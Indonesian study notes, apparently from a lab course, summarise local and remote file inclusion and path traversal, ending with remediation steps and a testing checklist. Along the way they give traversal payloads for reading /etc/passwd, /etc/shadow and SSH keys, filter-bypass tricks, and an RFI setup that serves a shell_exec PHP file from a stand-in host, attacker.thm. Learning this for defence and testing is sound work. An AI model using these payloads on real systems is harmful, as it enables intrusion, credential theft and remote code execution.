```
=== File Inclusion Vulnerability - Resume Materi ===
[09 May 2026]

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 APA ITU FILE INCLUSION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Definisi : Kerentanan saat web app menyertakan file berdasarkan
           input user tanpa validasi
Root cause: Input tidak divalidasi/disanitasi → user kendalikan input
Bahasa   : Sering terjadi di PHP (include, require, include_once,
           require_once) tapi juga ASP, JSP, Node.js
Tipe     : LFI (Local File Inclusion) → file di server sendiri
           RFI (Remote File Inclusion) → file dari server luar
           Path/Directory Traversal → navigasi direktori pakai ../

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ANATOMI URL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
http://webapp.thm/get.php?file=userCV.pdf
│         │        │      │    │
Protocol  Domain  File   ?=   Parameter & nilai
                        Query string begin

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 PATH / DIRECTORY TRAVERSAL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Teknik   : Pakai ../ (dot-dot-slash) untuk naik direktori
Contoh   : http://webapp.thm/get.php?file=../../../../etc/passwd
Cara baca: Setiap ../ naik satu level direktori
           /var/www/html/app → ../ → /var/www/html → ../ → /var/www → dst

File OS sensitif yang sering jadi target :
  Linux :
    /etc/passwd       → daftar semua user di sistem
    /etc/shadow       → info password user
    /etc/issue        → pesan sebelum login prompt
    /etc/profile      → variabel default sistem
    /proc/version     → versi Linux kernel
    /root/.bash_history → riwayat perintah root
    /root/.ssh/id_rsa → private SSH key
    /var/log/apache2/access.log → log Apache
    /var/mail/root    → email root
  Windows :
    C:\boot.ini       → opsi boot BIOS

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 LOCAL FILE INCLUSION (LFI)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Tujuan   : Memaksa server membaca & menampilkan file sensitif
           yang harusnya tidak bisa diakses user biasa
Risiko   : Bocorkan kode, credentials, file OS penting
           Kalau bisa tulis file → bisa RCE

Skenario & teknik bypass :

#1 - Tidak ada validasi sama sekali
     Payload : /etc/passwd
     Langsung baca file tanpa filter apapun

#2 - Ada hardcode direktori di depan
     Kode   : include("languages/" . $_GET['lang'])
     Payload : ../../../../etc/passwd
     Pakai ../ untuk keluar dari direktori hardcode

#3 - Black box + server tambahin .php di belakang
     Deteksi : dari error → include(input.php)
     Payload : ../../../../etc/passwd%00
     %00 = NULL BYTE → motong .php yang ditambahkan
     CATATAN: tidak bekerja di PHP 5.3.4 ke atas

#4 - Keyword /etc/passwd difilter/diblokir
     Payload : ../../../../etc/passwd/.
               atau ../../../../etc/passwd%00
     /. = current directory trick → server baca sebagai
     path valid tapi lolos filter kata kunci

#5 - ../ dihapus/diganti string kosong
     Deteksi : dari error → ../ menghilang dari path
     Payload : ....//....//....//....//etc/passwd
     Filter hanya hapus ../ sekali, sisa karakter
     membentuk ../ baru setelah filter jalan

#6 - Developer paksa direktori di input
     Deteksi : error / placeholder form / access denied
     Payload : namadirektori/../../../../etc/passwd
     Direktori wajib ada di depan payload

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 CARA BACA ERROR MESSAGE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Error PHP membocorkan info penting :
  include(languages/THM.php)
  → ada "languages/" = hardcode direktori di depan
  → ada ".php" di belakang = server nambahin ekstensi

  include(etc/passwd) → ../ dihapus = filter aktif

  Access Denied! Allowed files at X folder only!
  → direktori X wajib ada di input

Kalau tidak ada error → error PHP dimatikan
→ pakai trial and error berdasarkan pola response

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ENTRY POINT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Entry point = pintu masuk input ke server
Bisa lewat : GET  → parameter di URL (?file=)
             POST → parameter di body request
             Cookie → nilai cookie dikirim ke server
             HTTP Header → nilai di header request

$_REQUEST di PHP = menerima GET, POST, dan cookie sekaligus
→ kalau GET gagal karena encoding browser, coba POST via Burpsuite

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 GET vs POST
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
GET  → data di URL → browser encode ../ jadi %2F%2E
       tidak perlu Content-Type
POST → data di body → tidak di-encode browser
       wajib pakai header :
       Content-Type: application/x-www-form-urlencoded
       Content-Length: [panjang body]

Format body POST : key=value → file=../../../../etc/passwd%00
Alternatif Content-Type : application/json → {"file":"..."}
                          multipart/form-data → upload file

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 NULL BYTE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Simbol   : %00 atau 0x00
Fungsi   : Mengakhiri string → apapun setelahnya diabaikan
Contoh   : passwd%00.php → server baca sebagai passwd saja
Cara kirim: Lewat URL address bar langsung (bukan form)
            atau lewat Burpsuite Repeater (raw)
Limitasi : Sudah dipatch di PHP 5.3.4 ke atas

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 REMOTE FILE INCLUSION (RFI)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Definisi : Menyuntikkan URL file dari server hacker ke server korban
Syarat   : allow_url_fopen = on di konfigurasi PHP server korban
Risiko   : Lebih berbahaya dari LFI karena bisa langsung RCE
Konsekuensi lain : XSS, DoS, Sensitive Info Disclosure

Alur serangan RFI :
  1. Hacker siapkan file PHP berbahaya di server sendiri
  2. Hacker suntikkan URL file itu ke parameter server korban
     → ?lang=http://attacker.thm/cmd.txt
  3. Server korban GET request ke server hacker ambil file
  4. File dieksekusi di server korban (bukan server hacker)
  5. Output tampil di halaman → hacker lihat hasilnya

Setup server hacker (Kali) :
  Buat file PHP :
    cat > /tmp/cmd.txt << 'EOF'
    <?php echo shell_exec("perintah"); ?>
    EOF

  Jalankan web server :
    cd /tmp && python3 -m http.server 8888

  python3 -m http.server → jalankan modul http.server bawaan Python
  -m = flag untuk jalankan modul
  8888 = port yang dipakai

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 RCE VIA RFI
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Fungsi PHP untuk eksekusi perintah OS :
  shell_exec("cmd") → jalankan perintah, return output sebagai string
  system("cmd")     → jalankan & langsung print output
  exec("cmd")       → jalankan, return baris terakhir output
  passthru("cmd")   → jalankan, output langsung ke browser

Contoh payload RCE :
  <?php echo shell_exec("hostname"); ?>  → nama host server
  <?php echo shell_exec("whoami"); ?>    → user yang jalan
  <?php echo shell_exec("id"); ?>        → info user & group
  <?php echo shell_exec("ls /"); ?>      → isi root directory

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 URL ENCODING YANG WAJIB HAPAL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
%00 = NULL BYTE
%2F = / (slash)
%2E = . (dot)
%00 lewat form = di-encode jadi %2500 (tidak berhasil)
%00 lewat URL/Burpsuite = dikirim langsung (berhasil)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 REMEDIASI (SISI DEVELOPER)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Update sistem & framework ke versi terbaru
2. Matikan error PHP (jangan bocorkan path & info sistem)
3. Pasang WAF (Web Application Firewall)
4. Nonaktifkan allow_url_fopen & allow_url_include jika tidak perlu
5. Hanya izinkan protokol & PHP wrapper yang dibutuhkan
6. Jangan percaya input user → implementasi validasi input ketat
7. Whitelist nama file & lokasi yang diizinkan + blacklist

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ALUR TESTING LFI (LANGKAH-LANGKAH)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Temukan entry point → GET, POST, Cookie, HTTP header
2. Input valid dulu → lihat perilaku normal server
3. Input tidak valid → lihat error message
4. Analisa error → ketahui direktori hardcode & filter aktif
5. Pilih teknik bypass sesuai kondisi
6. Kalau GET gagal karena encoding → pakai POST via Burpsuite
7. Kalau ada .php di error → coba null byte %00
8. Kalau ../ hilang di error → coba ....//
9. Kalau ada access denied → cari direktori yang diizinkan
10. Trial and error kalau tidak ada error message sama sekali
```